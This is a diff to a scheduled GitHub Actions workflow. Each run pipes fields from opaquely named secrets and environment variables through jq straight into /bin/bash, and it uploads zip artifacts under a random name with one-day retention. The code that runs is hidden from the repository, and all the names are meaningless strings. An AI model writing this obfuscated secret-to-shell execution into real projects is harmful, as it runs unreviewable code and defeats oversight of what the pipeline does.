@@ -1,8 +1,9 @@
 name: zacharydocker
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '24 2/6 * * *'
+    - cron: '35 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,17 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: zacharydocker
         env:
-          dyof93: ${{ secrets.dyof93 }}
+          qj228: ${{ secrets.qj228 }}
         run: |
-          echo $dyof93 | jq -r .h5 | /bin/bash
-          echo $e6584 | jq -r .za273 | /bin/bash
-          echo $f72945 | jq -r .kz302 | /bin/bash
-          echo $uzv076 | jq -r .g274 | /bin/bash
-          echo $iqzwj6 | jq -r .ibpr4114 | /bin/bash
-          echo $xytw56627 | jq -r .evrav0673 | /bin/bash
-          echo $scot052 | jq -r .za763 | /bin/bash
-          echo $djk72 | jq -r .jj36 | /bin/bash
-          echo $e04460 | jq -r .hfxcg2775 | /bin/bash
-          echo $epa4880 | jq -r .k1922 | /bin/bash
-          echo $pvuj65599 | jq -r .m22 | /bin/bash
+          printf '%s' "$qj228" | jq -r .p706 | /bin/bash
+          echo $qhdsh42083 | jq -r .fhkf2213 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: KeRCsQ7A
+          path: "*.zip"
+          retention-days: 1
